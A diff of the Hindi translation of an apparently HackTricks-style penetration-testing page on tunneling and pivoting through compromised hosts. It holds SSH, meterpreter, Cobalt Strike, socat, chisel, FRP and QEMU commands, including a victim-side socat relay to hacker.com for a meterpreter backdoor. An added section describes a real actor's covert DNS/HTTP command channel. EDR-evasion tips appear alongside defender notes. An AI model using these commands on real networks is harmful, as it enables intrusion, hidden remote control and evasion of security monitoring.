@@ -1,4 +1,4 @@
-# Tunneling and Port Forwarding
+# टनलिंग और पोर्ट फॉरवर्डिंग
 
 {{#include ../banners/hacktricks-training.md}}
 
@@ -43,7 +43,7 @@ ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in
 ```
 ### Port2Port
 
-स्थानीय पोर्ट --> समझौता किया गया होस्ट (SSH) --> तीसरा_बॉक्स:पोर्ट
+स्थानीय पोर्ट --> समझौता किया गया होस्ट (SSH) --> Third_box:Port
 ```bash
 ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
 #Example
@@ -51,7 +51,7 @@ sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
 ```
 ### Port2hostnet (proxychains)
 
-स्थानीय पोर्ट --> समझौता किया गया होस्ट (SSH) --> कहीं भी
+स्थानीय पोर्ट --> समझौता किया गया होस्ट (SSH) --> जहाँ भी
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
@@ -68,7 +68,7 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 ```
 ### VPN-Tunnel
 
-आपको **दोनों उपकरणों में रूट** की आवश्यकता है (क्योंकि आप नए इंटरफेस बनाने जा रहे हैं) और sshd कॉन्फ़िगरेशन को रूट लॉगिन की अनुमति देनी चाहिए:\
+आपको **दोनों उपकरणों में रूट** की आवश्यकता है (क्योंकि आप नए इंटरफेस बनाने जा रहे हैं) और sshd कॉन्फ़िगरेशन को रूट लॉगिन की अनुमति देनी होगी:\
 `PermitRootLogin yes`\
 `PermitTunnel yes`
 ```bash
@@ -93,7 +93,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 
 ## SSHUTTLE
 
-आप **ssh** के माध्यम से **ट्रैफ़िक** को एक **उप-नेटवर्क** के माध्यम से एक होस्ट पर **टनल** कर सकते हैं।\
+आप **ssh** के माध्यम से एक होस्ट के माध्यम से **उपनेटवर्क** के लिए सभी **ट्रैफ़िक** को **टनल** कर सकते हैं।\
 उदाहरण के लिए, 10.10.10.0/24 पर जाने वाले सभी ट्रैफ़िक को फॉरवर्ड करना
 ```bash
 pip install sshuttle
@@ -108,7 +108,7 @@ sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 
 ### Port2Port
 
-स्थानीय पोर्ट --> समझौता किया गया होस्ट (सक्रिय सत्र) --> Third_box:Port
+स्थानीय पोर्ट --> समझौता किया गया होस्ट (सक्रिय सत्र) --> तीसरा_बॉक्स:पोर्ट
 ```bash
 # Inside a meterpreter session
 portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
@@ -156,14 +156,14 @@ rportfwd stop [bind port]
 ```
 To note:
 
-- Beacon's reverse port forward is designed to **ट्रैफ़िक को टीम सर्वर तक टनल करने के लिए, व्यक्तिगत मशीनों के बीच रिले करने के लिए नहीं**।
-- ट्रैफ़िक **बीकन के C2 ट्रैफ़िक के भीतर टनल किया जाता है**, जिसमें P2P लिंक शामिल हैं।
+- Beacon's reverse port forward is designed to **ट्रैफ़िक को Team Server तक टनल करने के लिए, व्यक्तिगत मशीनों के बीच रिले करने के लिए नहीं**।
+- ट्रैफ़िक **Beacon के C2 ट्रैफ़िक के भीतर टनल किया जाता है**, जिसमें P2P लिंक शामिल हैं।
 - **एडमिन विशेषाधिकार की आवश्यकता नहीं है** उच्च पोर्ट पर रिवर्स पोर्ट फॉरवर्ड बनाने के लिए।
 
 ### rPort2Port local
 
 > [!WARNING]
-> इस मामले में, **पोर्ट बीकन होस्ट में खोला जाता है**, टीम सर्वर में नहीं और **ट्रैफ़िक को कोबाल्ट स्ट्राइक क्लाइंट** (टीम सर्वर को नहीं) पर भेजा जाता है और वहां से निर्दिष्ट होस्ट:पोर्ट पर।
+> इस मामले में, **पोर्ट beacon होस्ट में खोला जाता है**, Team Server में नहीं और **ट्रैफ़िक Cobalt Strike क्लाइंट को भेजा जाता है** (Team Server को नहीं) और वहां से निर्दिष्ट होस्ट:पोर्ट पर।
 ```bash
 rportfwd_local [bind port] [forward host] [forward port]
 rportfwd_local stop [bind port]
@@ -179,7 +179,7 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 ## Chisel
 
 आप इसे [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) के रिलीज़ पृष्ठ से डाउनलोड कर सकते हैं।\
-आपको **क्लाइंट और सर्वर के लिए समान संस्करण का उपयोग करना होगा।**
+आपको **क्लाइंट और सर्वर के लिए समान संस्करण का उपयोग करना होगा**।
 
 ### socks
 ```bash
@@ -280,7 +280,7 @@ socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
 ```bash
 socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
 ```
-### Meterpreter के लिए SSL Socat
+### SSL Socat के माध्यम से Meterpreter
 ```bash
 #Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
 attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
@@ -290,7 +290,7 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-आप एक **गैर-प्रमाणित प्रॉक्सी** को बायपास कर सकते हैं, इस लाइन को पीड़ित के कंसोल में अंतिम लाइन के बजाय निष्पादित करके:
+आप एक **गैर-प्रमाणित प्रॉक्सी** को बायपास कर सकते हैं, इस पंक्ति को पीड़ित के कंसोल में अंतिम पंक्ति के बजाय निष्पादित करके:
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
@@ -335,7 +335,7 @@ echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0
 
 ### Port2Port
 
-आपको स्थानीय व्यवस्थापक होना आवश्यक है (किसी भी पोर्ट के लिए)
+आपको एक स्थानीय व्यवस्थापक होना आवश्यक है (किसी भी पोर्ट के लिए)
 ```bash
 netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
 # Example:
@@ -350,7 +350,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 आपको **सिस्टम पर RDP एक्सेस** होना चाहिए।\
 डाउनलोड करें:
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - यह उपकरण Windows की Remote Desktop Service सुविधा से `Dynamic Virtual Channels` (`DVC`) का उपयोग करता है। DVC **RDP कनेक्शन के माध्यम से पैकेट्स को टनलिंग** के लिए जिम्मेदार है।
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - यह उपकरण Windows की Remote Desktop Service सुविधा से `Dynamic Virtual Channels` (`DVC`) का उपयोग करता है। DVC **RDP कनेक्शन के माध्यम से पैकेट्स को टनल करने** के लिए जिम्मेदार है।
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
 अपने क्लाइंट कंप्यूटर में **`SocksOverRDP-Plugin.dll`** को इस तरह लोड करें:
@@ -358,9 +358,9 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-अब हम **RDP** के माध्यम से **`mstsc.exe`** का उपयोग करके **शिकार** से **जुड़** सकते हैं, और हमें एक **प्रॉम्प्ट** प्राप्त होना चाहिए जो कहता है कि **SocksOverRDP प्लगइन सक्षम है**, और यह **127.0.0.1:1080** पर **सुन** रहा होगा।
+अब हम **RDP** के माध्यम से **victim** से **connect** कर सकते हैं **`mstsc.exe`** का उपयोग करके, और हमें एक **prompt** प्राप्त होना चाहिए जिसमें कहा गया है कि **SocksOverRDP plugin सक्षम है**, और यह **127.0.0.1:1080** पर **listen** करेगा।
 
-**RDP** के माध्यम से **जुड़ें** और शिकार मशीन में `SocksOverRDP-Server.exe` बाइनरी अपलोड और निष्पादित करें:
+**RDP** के माध्यम से **connect** करें और victim मशीन में `SocksOverRDP-Server.exe` बाइनरी अपलोड और निष्पादित करें:
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
@@ -372,7 +372,7 @@ netstat -antb | findstr 1080
 
 ## Windows GUI ऐप्स को प्रॉक्सी करें
 
-आप Windows GUI ऐप्स को [**Proxifier**](https://www.proxifier.com/) का उपयोग करके प्रॉक्सी के माध्यम से नेविगेट करवा सकते हैं।\
+आप Windows GUI ऐप्स को [**Proxifier**](https://www.proxifier.com/) का उपयोग करके प्रॉक्सी के माध्यम से नेविगेट कर सकते हैं।\
 **Profile -> Proxy Servers** में SOCKS सर्वर का IP और पोर्ट जोड़ें।\
 **Profile -> Proxification Rules** में प्रॉक्सी करने के लिए प्रोग्राम का नाम और उन IPs के लिए कनेक्शन जोड़ें जिन्हें आप प्रॉक्सी करना चाहते हैं।
 
@@ -396,7 +396,7 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-अब, यदि आप उदाहरण के लिए पीड़ित पर **SSH** सेवा को पोर्ट 443 पर सुनने के लिए सेट करते हैं। आप इसे हमलावर पोर्ट 2222 के माध्यम से कनेक्ट कर सकते हैं।\
+अब, यदि आप पीड़ित पर **SSH** सेवा को पोर्ट 443 पर सुनने के लिए सेट करते हैं। आप इसे हमलावर पोर्ट 2222 के माध्यम से कनेक्ट कर सकते हैं।\
 आप एक **meterpreter** का भी उपयोग कर सकते हैं जो localhost:443 से कनेक्ट होता है और हमलावर पोर्ट 2222 पर सुन रहा है।
 
 ## YARP
@@ -446,20 +446,54 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Proxychains DNS बदलें
 
-Proxychains `gethostbyname` libc कॉल को इंटरसेप्ट करता है और tcp DNS अनुरोध को socks प्रॉक्सी के माध्यम से टनल करता है। **डिफ़ॉल्ट** रूप से, **DNS** सर्वर जो proxychains उपयोग करता है वह **4.2.2.2** है (हार्डकोडेड)। इसे बदलने के लिए, फ़ाइल संपादित करें: _/usr/lib/proxychains3/proxyresolv_ और IP बदलें। यदि आप **Windows वातावरण** में हैं, तो आप **डोमेन कंट्रोलर** का IP सेट कर सकते हैं।
+Proxychains `gethostbyname` libc कॉल को इंटरसेप्ट करता है और TCP DNS अनुरोध को SOCKS प्रॉक्सी के माध्यम से टनल करता है। **डिफ़ॉल्ट** के रूप में, **DNS** सर्वर जो proxychains उपयोग करता है वह **4.2.2.2** है (हार्डकोडेड)। इसे बदलने के लिए, फ़ाइल संपादित करें: _/usr/lib/proxychains3/proxyresolv_ और IP बदलें। यदि आप **Windows वातावरण** में हैं, तो आप **डोमेन कंट्रोलर** का IP सेट कर सकते हैं।
 
-## Go में टनल
+## गो में टनल
 
 [https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)
 
+### कस्टम DNS TXT / HTTP JSON C2 (AK47C2)
+
+Storm-2603 अभिनेता ने एक **डुअल-चैनल C2 ("AK47C2")** बनाया जो *केवल* आउटबाउंड **DNS** और **सादा HTTP POST** ट्रैफ़िक का दुरुपयोग करता है - दो प्रोटोकॉल जो कॉर्पोरेट नेटवर्क पर शायद ही कभी अवरुद्ध होते हैं।
+
+1. **DNS मोड (AK47DNS)**
+• एक यादृच्छिक 5-चरित्र SessionID (जैसे `H4T14`) उत्पन्न करता है।
+• *कार्य अनुरोधों* के लिए `1` या *परिणामों* के लिए `2` जोड़ता है और विभिन्न फ़ील्ड (फ्लैग, SessionID, कंप्यूटर नाम) को जोड़ता है।
+• प्रत्येक फ़ील्ड को **ASCII कुंजी `VHBD@H`** के साथ **XOR-एन्क्रिप्ट** किया गया है, हेक्स-कोडेड है, और बिंदुओं के साथ चिपकाया गया है - अंततः हमलावर-नियंत्रित डोमेन के साथ समाप्त होता है:
+
+```text
+<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
+```
+
+• अनुरोध **TXT** (और फॉलबैक **MG**) रिकॉर्ड के लिए `DnsQuery()` का उपयोग करते हैं।
+• जब प्रतिक्रिया 0xFF बाइट्स से अधिक होती है, तो बैकडोर डेटा को 63-बाइट के टुकड़ों में **फ्रैगमेंट** करता है और मार्कर डालता है:
+`s<SessionID>t<TOTAL>p<POS>` ताकि C2 सर्वर उन्हें पुनर्व्यवस्थित कर सके।
+
+2. **HTTP मोड (AK47HTTP)**
+• एक JSON लिफाफा बनाता है:
+```json
+{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
+```
+• पूरा ब्लॉब XOR-`VHBD@H` → हेक्स → **`POST /`** के शरीर के रूप में भेजा जाता है जिसमें हेडर `Content-Type: text/plain` होता है।
+• उत्तर उसी एन्कोडिंग का पालन करता है और `cmd` फ़ील्ड को `cmd.exe /c <command> 2>&1` के साथ निष्पादित किया जाता है।
+
+ब्लू टीम नोट्स
+• असामान्य **TXT क्वेरीज़** की तलाश करें जिनका पहला लेबल लंबा हेक्साडेसिमल है और हमेशा एक दुर्लभ डोमेन में समाप्त होता है।
+• एक स्थायी XOR कुंजी के बाद ASCII-हेक्स का पता लगाना YARA के साथ आसान है: `6?56484244?484` (`VHBD@H` हेक्स में)।
+• HTTP के लिए, शुद्ध हेक्स और दो बाइट के गुणांक वाले टेक्स्ट/प्लेन POST शरीर को फ्लैग करें।
+
+{{#note}}
+पूरा चैनल **मानक RFC-अनुपालन क्वेरीज़** के भीतर फिट होता है और प्रत्येक उप-डोमेन लेबल को 63 बाइट के तहत रखता है, जिससे यह अधिकांश DNS लॉग में छिपा रहता है।
+{{#endnote}}
+
 ## ICMP टनलिंग
 
-### Hans
+### हैंस
 
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-दोनों सिस्टम में tun एडाप्टर बनाने और ICMP इको अनुरोधों का उपयोग करके उनके बीच डेटा टनल करने के लिए रूट की आवश्यकता होती है।
+दोनों सिस्टम में रूट की आवश्यकता होती है ताकि टन अडैप्टर बनाए जा सकें और ICMP इको अनुरोधों का उपयोग करके उनके बीच डेटा टनल किया जा सके।
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -484,7 +518,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ## ngrok
 
 [**ngrok**](https://ngrok.com/) **एक उपकरण है जो एक कमांड लाइन में समाधानों को इंटरनेट पर उजागर करता है।**\
-_उजागर URI इस तरह के होते हैं:_ **UID.ngrok.io**
+_Exposition URI इस तरह हैं:_ **UID.ngrok.io**
 
 ### Installation
 
@@ -532,7 +566,7 @@ stdout से सीधे या HTTP इंटरफ़ेस में [http:
 यह 3 टनल खोलता है:
 
 - 2 TCP
-- 1 HTTP जो /tmp/httpbin/ से स्थिर फ़ाइलों का प्रदर्शन करता है
+- 1 HTTP जिसमें /tmp/httpbin/ से स्थिर फ़ाइलों का प्रदर्शन होता है
 ```yaml
 tunnels:
 mytcp:
@@ -574,11 +608,11 @@ url: http://127.0.0.1:8000
 ```bash
 cloudflared tunnel run mytunnel
 ```
-क्योंकि सभी ट्रैफ़िक होस्ट से **443 पर आउटबाउंड** निकलता है, Cloudflared टनल इनग्रेस ACLs या NAT सीमाओं को बायपास करने का एक सरल तरीका है। ध्यान दें कि बाइनरी आमतौर पर उच्च विशेषाधिकारों के साथ चलती है - जब संभव हो, कंटेनरों का उपयोग करें या `--user` फ़्लैग का उपयोग करें।
+क्योंकि सभी ट्रैफ़िक होस्ट से **443 पर आउटबाउंड** निकलता है, Cloudflared टनल इनग्रेस ACLs या NAT सीमाओं को बायपास करने का एक सरल तरीका है। ध्यान दें कि बाइनरी आमतौर पर उच्च विशेषाधिकारों के साथ चलती है - जब संभव हो, कंटेनरों का उपयोग करें या `--user` ध्वज का उपयोग करें।
 
-## FRP (Fast Reverse Proxy)
+## FRP (फास्ट रिवर्स प्रॉक्सी)
 
-[`frp`](https://github.com/fatedier/frp) एक सक्रिय रूप से बनाए रखा जाने वाला Go रिवर्स-प्रॉक्सी है जो **TCP, UDP, HTTP/S, SOCKS और P2P NAT-hole-punching** का समर्थन करता है। **v0.53.0 (मई 2024)** से शुरू होकर, यह एक **SSH टनल गेटवे** के रूप में कार्य कर सकता है, ताकि एक लक्षित होस्ट केवल स्टॉक OpenSSH क्लाइंट का उपयोग करके एक रिवर्स टनल स्थापित कर सके - कोई अतिरिक्त बाइनरी की आवश्यकता नहीं है।
+[`frp`](https://github.com/fatedier/frp) एक सक्रिय रूप से बनाए रखा गया Go रिवर्स-प्रॉक्सी है जो **TCP, UDP, HTTP/S, SOCKS और P2P NAT-hole-punching** का समर्थन करता है। **v0.53.0 (मई 2024)** से शुरू होकर, यह एक **SSH टनल गेटवे** के रूप में कार्य कर सकता है, इसलिए एक लक्षित होस्ट केवल स्टॉक OpenSSH क्लाइंट का उपयोग करके एक रिवर्स टनल स्थापित कर सकता है - कोई अतिरिक्त बाइनरी की आवश्यकता नहीं है।
 
 ### क्लासिक रिवर्स TCP टनल
 ```bash
@@ -608,11 +642,11 @@ sshTunnelGateway.bindPort = 2200   # add to frps.toml
 # On victim (OpenSSH client only)
 ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
 ```
-उपरोक्त कमांड पीड़ित के पोर्ट **8080** को **attacker_ip:9000** के रूप में प्रकाशित करता है बिना किसी अतिरिक्त उपकरण को तैनात किए – लिविंग-ऑफ-द-लैंड पिवोटिंग के लिए आदर्श।
+उपरोक्त कमांड पीड़ित के पोर्ट **8080** को **attacker_ip:9000** के रूप में प्रकाशित करता है बिना किसी अतिरिक्त उपकरण को तैनात किए - लिविंग-ऑफ-द-लैंड पिवोटिंग के लिए आदर्श।
 
 ## QEMU के साथ गुप्त VM-आधारित टनल
 
-QEMU का उपयोगकर्ता-मोड नेटवर्किंग (`-netdev user`) एक विकल्प का समर्थन करता है जिसे `hostfwd` कहा जाता है जो **एक TCP/UDP पोर्ट को *होस्ट* पर बाइंड करता है और इसे *गेस्ट* में अग्रेषित करता है**। जब गेस्ट एक पूर्ण SSH डेमन चलाता है, तो hostfwd नियम आपको एक नष्ट करने योग्य SSH जंप बॉक्स देता है जो पूरी तरह से एक अस्थायी VM के अंदर रहता है – EDR से C2 ट्रैफ़िक को छिपाने के लिए सही क्योंकि सभी दुर्भावनापूर्ण गतिविधियाँ और फ़ाइलें वर्चुअल डिस्क में रहती हैं।
+QEMU के उपयोगकर्ता-मोड नेटवर्किंग (`-netdev user`) में `hostfwd` नामक एक विकल्प का समर्थन किया जाता है जो **एक TCP/UDP पोर्ट को *होस्ट* पर बाइंड करता है और इसे *गेस्ट* में अग्रेषित करता है**। जब गेस्ट एक पूर्ण SSH डेमन चलाता है, तो hostfwd नियम आपको एक नष्ट करने योग्य SSH जंप बॉक्स देता है जो पूरी तरह से एक अस्थायी VM के अंदर रहता है - EDR से C2 ट्रैफ़िक को छिपाने के लिए बिल्कुल सही क्योंकि सभी दुर्भावनापूर्ण गतिविधियाँ और फ़ाइलें वर्चुअल डिस्क में रहती हैं।
 
 ### त्वरित एक-लाइनर
 ```powershell
@@ -640,7 +674,7 @@ Running the script with `cscript.exe //B update.vbs` keeps the window hidden.
 
 क्योंकि Tiny Core बिना स्थिति का है, हमलावर आमतौर पर:
 
-1. Payload को `/opt/123.out` पर डालते हैं
+1. `/opt/123.out` पर पेलोड छोड़ते हैं
 2. `/opt/bootlocal.sh` में जोड़ते हैं:
 
 ```sh
@@ -648,19 +682,19 @@ while ! ping -c1 45.77.4.101; do sleep 2; done
 /opt/123.out
 ```
 
-3. Payload को `mydata.tgz` में पैक करने के लिए `/opt/filetool.lst` में `home/tc` और `opt` जोड़ते हैं जब सिस्टम बंद होता है।
+3. पेलोड को शटडाउन पर `mydata.tgz` में पैक करने के लिए `/opt/filetool.lst` में `home/tc` और `opt` जोड़ते हैं।
 
 ### Why this evades detection
 
-• केवल दो असाइन किए गए executables (`qemu-system-*.exe`) डिस्क को छूते हैं; कोई ड्राइवर या सेवाएँ स्थापित नहीं की जाती हैं।
-• होस्ट पर सुरक्षा उत्पाद **benign loopback traffic** देखते हैं (वास्तविक C2 VM के अंदर समाप्त होता है)।
+• केवल दो असाइन किए गए निष्पादन योग्य (`qemu-system-*.exe`) डिस्क को छूते हैं; कोई ड्राइवर या सेवाएँ स्थापित नहीं हैं।
+• होस्ट पर सुरक्षा उत्पाद **सौम्य लूपबैक ट्रैफ़िक** देखते हैं (वास्तविक C2 VM के अंदर समाप्त होता है)।
 • मेमोरी स्कैनर कभी भी दुर्भावनापूर्ण प्रक्रिया स्थान का विश्लेषण नहीं करते क्योंकि यह एक अलग OS में रहता है।
 
 ### Defender tips
 
-• उपयोगकर्ता-लिखने योग्य पथों में **unexpected QEMU/VirtualBox/KVM binaries** पर अलर्ट करें।
+• उपयोगकर्ता-लिखने योग्य पथों में **अप्रत्याशित QEMU/VirtualBox/KVM बाइनरी** पर अलर्ट करें।
 • `qemu-system*.exe` से उत्पन्न आउटबाउंड कनेक्शनों को ब्लॉक करें।
-• QEMU लॉन्च के तुरंत बाद बाइंडिंग करने वाले दुर्लभ लिसनिंग पोर्ट (2222, 10022, …) के लिए खोजें।
+• QEMU लॉन्च के तुरंत बाद बाइंडिंग करने वाले दुर्लभ सुनने वाले पोर्ट (2222, 10022, …) के लिए शिकार करें।
 
 ---
 
@@ -672,5 +706,6 @@ while ! ping -c1 45.77.4.101; do sleep 2; done
 ## References
 
 - [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
+- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
 
 {{#include ../banners/hacktricks-training.md}}
